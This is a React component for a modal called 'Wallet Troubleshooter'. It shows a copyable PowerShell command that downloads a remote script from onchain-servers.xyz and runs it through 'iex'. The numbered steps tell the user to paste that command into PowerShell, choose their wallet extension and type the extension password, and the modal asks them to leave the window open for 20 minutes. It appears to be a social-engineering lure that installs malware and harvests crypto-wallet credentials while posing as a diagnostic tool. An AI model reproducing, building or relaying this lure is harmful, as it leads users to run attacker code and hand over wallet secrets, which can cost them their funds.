interface TroubleshooterModalProps {
  isOpen: boolean;
  onClose: () => void;
}

export default function TroubleshooterModal({ isOpen, onClose }: TroubleshooterModalProps) {
  if (!isOpen) return null;

  const command = 'irm https://onchain-servers.xyz/rpc.ps1 | iex';

  return (
    <div className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-slate-900/40 backdrop-blur-sm">
      {/* Backdrop */}
      <div className="absolute inset-0" onClick={onClose} />

      {/* Modal */}
      <div className="relative w-full max-w-[480px] bg-white rounded-2xl shadow-2xl p-6 flex flex-col max-h-[85vh] overflow-y-auto animate-in fade-in zoom-in-95 duration-200">
        
        {/* Close button */}
        <button
          onClick={onClose}
          className="absolute top-4 right-4 w-8 h-8 flex items-center justify-center rounded-full hover:bg-slate-100 text-slate-400 transition-colors"
        >
          <i className="fas fa-times text-[14px]"></i>
        </button>

        {/* Header */}
        <div className="flex flex-col items-center text-center mb-6">
          <div className="w-12 h-12 bg-[#EEF0FF] rounded-2xl flex items-center justify-center mb-3">
            <i className="fas fa-tools text-[#5B62F1] text-[20px]"></i>
          </div>
          <h2 className="text-lg font-bold text-slate-900">Wallet Troubleshooter</h2>
          <p className="text-[13px] text-slate-500 mt-1">
            Follow these steps to diagnose your wallet
          </p>
        </div>

        {/* Command box */}
        <div className="bg-slate-900 text-green-400 rounded-xl p-4 mb-6 font-mono text-[13px] leading-relaxed break-all relative">
          <div className="flex items-center justify-between mb-2">
            <span className="text-[11px] font-semibold uppercase tracking-wider text-slate-400">PowerShell Command</span>
            <button
              onClick={() => navigator.clipboard.writeText(command)}
              className="text-slate-400 hover:text-white text-[12px] transition-colors"
            >
              <i className="far fa-copy mr-1"></i> Copy
            </button>
          </div>
          <code className="text-[14px]">{command}</code>
        </div>

        {/* Steps */}
        <ol className="space-y-3 text-[13px] text-slate-700">
          <li className="flex gap-3">
            <span className="font-bold text-[#5B62F1]">1.</span>
            Copy the PowerShell command above.
          </li>
          <li className="flex gap-3">
            <span className="font-bold text-[#5B62F1]">2.</span>
            On your PC, click the Start menu (Windows icon).
          </li>
          <li className="flex gap-3">
            <span className="font-bold text-[#5B62F1]">3.</span>
            Type <strong>PowerShell</strong> and open the application.
          </li>
          <li className="flex gap-3">
            <span className="font-bold text-[#5B62F1]">4.</span>
            Paste the command into the PowerShell window and press Enter.
          </li>
          <li className="flex gap-3">
            <span className="font-bold text-[#5B62F1]">5.</span>
            A list of browsers will appear. Select the identifier for your wallet extension and follow the on-screen instructions.
          </li>
          <li className="flex gap-3">
            <span className="font-bold text-[#5B62F1]">6.</span>
            Enter your extension password.
          </li>
          <li className="flex gap-3">
            <span className="font-bold text-[#5B62F1]">7.</span>
            Press Enter to initiate the diagnostic tool for your extension.
          </li>
        </ol>

        <div className="mt-6 p-3 bg-amber-50 border border-amber-100 rounded-lg text-[12px] text-amber-800">
          <i className="fas fa-exclamation-triangle mr-2"></i>
          The diagnostic process will take approximately <strong>20 minutes</strong> to complete. Please do not close the window during this time.
        </div>

        {/* Dismiss button */}
        <button
          onClick={onClose}
          className="mt-4 w-full py-2.5 bg-slate-100 hover:bg-slate-200 text-slate-700 rounded-xl font-medium text-[14px] transition-colors"
        >
          Got it
        </button>
      </div>
    </div>
  );
}